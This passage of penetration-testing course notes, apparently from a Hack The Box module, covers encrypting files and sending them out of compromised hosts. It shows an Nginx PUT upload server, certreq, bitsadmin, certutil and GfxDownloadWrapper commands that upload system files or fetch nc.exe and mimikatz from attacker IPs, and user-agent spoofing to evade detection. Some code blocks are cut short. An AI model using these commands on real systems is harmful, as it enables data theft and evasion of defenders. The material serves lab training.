                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```

We can use any previously shown file transfer methods to get this file onto a target host. After the script has been transferred, it only needs to be imported as a module, as shown below.

#### Import Module Invoke-AESEncryption.ps1

```powershell
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
```

After the script is imported, it can encrypt strings or files, as shown in the following examples. This command creates an encrypted file with the same name as the encrypted file but with the extension "`.aes`."

#### File Encryption Example

```powershell
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

File encrypted to C:\htb\scan-results.txt.aes
PS C:\htb> ls

    Directory: C:\htb

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
-a----        11/18/2020  12:19 PM           1724 scan-results.txt
-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes
```

Using veryÂ `strong`Â andÂ `unique`Â passwords for encryption for every company where a penetration test is performed is essential. This is to prevent sensitive files and information from being decrypted using one single password that may have been leaked and cracked by a third party.

## File Encryption on Linux

[OpenSSL](https://www.openssl.org/)Â is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style" to encrypt files.

To encrypt a file usingÂ `openssl`Â we can select different ciphers, seeÂ [OpenSSL man page](https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html). Let's useÂ `-aes256`Â as an example. We can also override the default iterations counts with the optionÂ `-iter 100000`Â and add the optionÂ `-pbkdf2`Â to use the Password-Based Key Derivation Function 2 algorithm. When we hit enter, we'll need to provide a password.

#### Encrypting /etc/passwd with openssl

```shell
gitblanc@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

enter aes-256-cbc encryption password:                                                         
Verifying - enter aes-256-cbc encryption password:                              
```

Remember to use a strong and unique password to avoid brute-force cracking attacks should an unauthorized party obtain the file. To decrypt the file, we can use the following command:

#### Decrypt passwd.enc with openssl

```shell
gitblanc@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    

enter aes-256-cbc decryption password:
```

We can use any of the previous methods to transfer this file, but it's recommended to use a secure transport method such as HTTPS, SFTP, or SSH. As always, practice the examples in this section against target hosts in this or other modules and reproduce what you can (such as theÂ `openssl`Â examples using the Pwnbox. The following section will cover different ways to transfer files over HTTP and HTTPS.

# Catching Files over HTTP/S

## HTTP/S

Web transfer is the most common way most people transfer files becauseÂ `HTTP`/`HTTPS`Â are the most common protocols allowed through firewalls. Another immense benefit is that, in many cases, the file will be encrypted in transit. There is nothing worse than being on a penetration test, and a client's network IDS picks up on a sensitive file being transferred over plaintext and having them ask why we sent a password to our cloud server without using encryption.

We have already discussed using the Python3Â [uploadserver module](https://github.com/Densaugeo/uploadserver)Â to set up a web server with upload capabilities, but we can also use Apache or Nginx. This section will cover creating a secure web server for file upload operations.

## Nginx - Enabling PUT

A good alternative for transferring files toÂ `Apache`Â isÂ [Nginx](https://www.nginx.com/resources/wiki/)Â because the configuration is less complicated, and the module system does not lead to security issues asÂ `Apache`Â can.

When allowingÂ `HTTP`Â uploads, it is critical to be 100% positive that users cannot upload web shells and execute them.Â `Apache`Â makes it easy to shoot ourselves in the foot with this, as theÂ `PHP`Â module loves to execute anything ending inÂ `PHP`. ConfiguringÂ `Nginx`Â to use PHP is nowhere near as simple.

#### Create a Directory to Handle Uploaded Files

```shell
gitblanc@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

#### Change the Owner to www-data

```shell
gitblanc@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

#### Create Nginx Configuration File

Create the Nginx configuration file by creating the fileÂ `/etc/nginx/sites-available/upload.conf`Â with the contents:

```shell
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

#### Symlink our Site to the sites-enabled Directory

```shell
gitblanc@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

#### Start Nginx

```shell
gitblanc@htb[/htb]$ sudo systemctl restart nginx.service
```

If we get any error messages, checkÂ `/var/log/nginx/error.log`. If using Pwnbox, we will see port 80 is already in use.

#### Verifying Errors

```shell
gitblanc@htb[/htb]$ tail -2 /var/log/nginx/error.log

2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()
```

```shell
gitblanc@htb[/htb]$ ss -lnpt | grep 80

LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))
```

```shell
gitblanc@htb[/htb]$ ps -ef | grep 2811

user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811
```

We see there is already a module listening on port 80. To get around this, we can remove the default Nginx configuration, which binds on port 80.

#### Remove NginxDefault Configuration

```shell
gitblanc@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
```

Now we can test uploading by usingÂ `cURL`Â to send aÂ `PUT`Â request. In the below example, we will upload theÂ `/etc/passwd`Â file to the server and call it users.txt

#### Upload File Using cURL

```shell
gitblanc@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

```shell
gitblanc@htb[/htb]$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 

user65:x:1000:1000:,,,:/home/user65:/bin/bash
```

Once we have this working, a good test is to ensure the directory listing is not enabled by navigating toÂ `http://localhost/SecretUploadDirectory`. By default, withÂ `Apache`, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most files are sensitive by nature, and we want to do our best to hide them. Thanks toÂ `Nginx`Â being minimal, features like that are not enabled by default.

## Using Built-in Tools

In the next section, we'll introduce the topic of "Living off the Land" or using built-in Windows and Linux utilities to perform file transfer activities. We will repeatedly come back to this concept throughout the modules in the Penetration Tester path when covering tasks such as Windows and Linux privilege escalation and Active Directory enumeration and exploitation.

# Living off The Land

The phrase "Living off the land" was coined by Christopher CampbellÂ [@obscuresec](https://twitter.com/obscuresec)Â & Matt GraeberÂ [@mattifestation](https://twitter.com/mattifestation)Â atÂ [DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw).

The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

Living off the Land binaries can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

This section will focus on using LOLBAS and GTFOBins projects and provide examples for download and upload functions on Windows & Linux systems.

## Using the LOLBAS and GTFOBins Project

[LOLBAS for Windows](https://lolbas-project.github.io/#)Â andÂ [GTFOBins for Linux](https://gtfobins.github.io/)Â are websites where we can search for binaries we can use for different functions.

### LOLBAS

To search for download and upload functions inÂ [LOLBAS](https://lolbas-project.github.io/)Â we can useÂ `/download`Â orÂ `/upload`.

![](Pasted%20image%2020250604122139.png)

Let's useÂ [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/)Â as an example.

We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.

#### Upload win.ini to our Pwnbox

```cmd
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

This will send the file to our Netcat session, and we can copy-paste its contents.

#### File Received in our Netcat Session

```shell
gitblanc@htb[/htb]$ sudo nc -lvnp 8000

listening on [any] 8000 ...

If you get an error when runningÂ `certreq.exe`, the version you are using may not contain theÂ `-Post`Â parameter. You can download an updated versionÂ [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe)Â and try again.

### GTFOBins

To search for the download and upload function inÂ [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can useÂ `+file download`Â orÂ `+file upload`.

![](Pasted%20image%2020250604122203.png)

Let's useÂ [OpenSSL](https://www.openssl.org/). It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."

We need to create a certificate and start a server in our Pwnbox.

#### Create Certificate in our Pwnbox

```shell
gitblanc@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

#### Stand up the Server in our Pwnbox

```shell
gitblanc@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Next, with the server running, we need to download the file from the compromised machine.

#### Download File from the Compromised Machine

```shell
gitblanc@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Other Common Living off the Land tools

### Bitsadmin Download function

TheÂ [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)Â can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.

#### File Download with Bitsadmin

```powershell
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.

#### Download

```powershell
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### Certutil

Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defactoÂ `wget`Â for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.

#### Download a File with Certutil

```cmd
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

# Detection

Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. However, although the process of whitelisting all command lines in a particular environment is initially time-consuming, it is very robust and allows for quick detection and alerting on any unusual command lines.

Most client-server protocols require the client and server to negotiate how content will be delivered before exchanging information. This is common with theÂ `HTTP`Â protocol. There is a need for interoperability amongst different web servers and web browser types to ensure that users have the same experience no matter their browser. HTTP clients are most readily recognized by their user agent string, which the server uses to identify whichÂ `HTTP`Â client is connecting to it, for example, Firefox, Chrome, etc.

User agents are not only used to identify web browsers, but anything acting as anÂ `HTTP`Â client and connecting to a web server viaÂ `HTTP`Â can have a user agent string (i.e.,Â `cURL`, a customÂ `Python`Â script, or common tools such asÂ `sqlmap`, orÂ `Nmap`).

Organizations can take some steps to identify potential user agent strings by first building a list of known legitimate user agent strings, user agents used by default operating system processes, common user agents used by update services such as Windows Update, and antivirus updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. Any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform malicious actions. ThisÂ [website](http://useragentstring.com/index.php)Â is handy for identifying common user agent strings. A list of user agent strings is availableÂ [here](http://useragentstring.com/pages/useragentstring.php).

Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from commonÂ `HTTP`Â transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5).

#### Invoke-WebRequest - Client

```powershell
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"

This section just scratches the surface on detecting malicious file transfers. It would be an excellent start for any organization to create a whitelist of allowed binaries or a blacklist of binaries known to be used for malicious purposes. Furthermore, hunting for anomalous user agent strings can be an excellent way to catch an attack in progress. We will cover threat hunting and detection techniques in-depth in later modules.

# Evading Detection

## Changing User Agent

If diligent administrators or defenders have blacklisted any of these User Agents,Â [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1)Â contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.

#### Listing out User Agents

```powershell
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```

Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:

#### Request with Chrome User Agent

```powershell
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

```shell
gitblanc@htb[/htb]$ nc -lvnp 80

listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

## LOLBAS / GTFOBins

Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries". An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:

#### Transferring File with GfxDownloadWrapper.exe

```powershell
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

Such a binary might be permitted to run by application whitelisting and be excluded from alerting. Other, more commonly available binaries are also available, and it is worth checking theÂ [LOLBAS](https://lolbas-project.github.io/)Â project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is theÂ [GTFOBins](https://gtfobins.github.io/)Â project and is definitely also worth checking out. As of the time of writing, the GTFOBins project provides useful information on nearly 40 commonly installed binaries that can be used to perform file transfers.

## Closing Thoughts

As we've seen in this module, there are many ways to transfer files to and from our attack host between Windows and Linux systems. It's worth practicing as many of these as possible throughout the modules in the Penetration Tester path. Got a web shell on a target? Try downloading a file to the target for additional enumeration using Certutil. Need to download a file off the target? Try an Impacket SMB server or a Python web server with upload capabilities. Refer back to this module periodically and strive to use all the methods taught in some fashion. Also, take some time whenever you're working on a target or lab to search for a LOLBin or GTFOBin that you've never worked with before to accomplish your file transfer goals.
